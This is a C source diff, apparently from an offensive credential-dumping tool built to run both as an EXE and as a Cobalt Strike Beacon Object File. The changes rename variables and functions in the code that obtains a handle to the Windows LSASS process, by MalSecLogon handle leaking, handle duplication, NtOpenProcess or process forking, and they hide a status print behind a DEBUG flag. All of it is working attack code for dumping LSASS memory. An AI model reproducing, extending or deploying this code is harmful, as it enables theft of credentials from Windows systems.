@@ -38,23 +38,22 @@ HANDLE make_handle_full_access(
 
 // get a handle to LSASS via multiple methods
 HANDLE obtain_lsass_handle(
-    DWORD pid,
+    DWORD lsass_pid,
     DWORD permissions,
     BOOL dup,
     BOOL fork,
-    BOOL use_seclogon,
-    BOOL is_seclogon_stage_2,
-    LPCSTR dump_name
+    BOOL is_malseclogon_stage_2,
+    LPCSTR dump_path
 )
 {
     HANDLE hProcess = NULL;
     // use MalSecLogon to leak a handle to LSASS
-    if (is_seclogon_stage_2)
+    if (is_malseclogon_stage_2)
     {
         // this is always done from an EXE
 #ifndef BOF
-        hProcess = seclogon_stage_2(
-            dump_name
+        hProcess = malseclogon_stage_2(
+            dump_path
         );
 #endif
     }
@@ -62,15 +61,15 @@ HANDLE obtain_lsass_handle(
     else if (dup)
     {
         hProcess = duplicate_lsass_handle(
-            pid,
+            lsass_pid,
             permissions
         );
     }
     // good old NtOpenProcess
-    else if (pid)
+    else if (lsass_pid)
     {
         hProcess = get_process_handle(
-            pid,
+            lsass_pid,
             permissions,
             FALSE
         );
@@ -78,7 +77,7 @@ HANDLE obtain_lsass_handle(
     // use NtGetNextProcess until a handle to LSASS is obtained
     else
     {
-        // the variable pid should always be set
+        // the variable lsass_pid should always be set
         // this branch won't be called
         hProcess = find_lsass(
             permissions
@@ -439,6 +438,7 @@ HANDLE duplicate_lsass_handle(
             if (is_lsass(hDuped))
             {
                 // found LSASS handle
+#ifdef DEBUG
 #ifdef BOF
                 BeaconPrintf(CALLBACK_OUTPUT,
 #else
@@ -448,6 +448,7 @@ HANDLE duplicate_lsass_handle(
                     handleInfo->HandleValue,
                     handleInfo->UniqueProcessId
                 );
+#endif
                 intFree(handleTableInformation); handleTableInformation = NULL;
                 intFree(process_list); process_list = NULL;
                 NtClose(hProcess); hProcess = NULL;
@@ -475,7 +476,7 @@ HANDLE duplicate_lsass_handle(
 }
 
 // create a clone (fork) of the LSASS process
-HANDLE fork_lsass_process(
+HANDLE fork_process(
     DWORD dwPid,
     HANDLE hProcess
 )
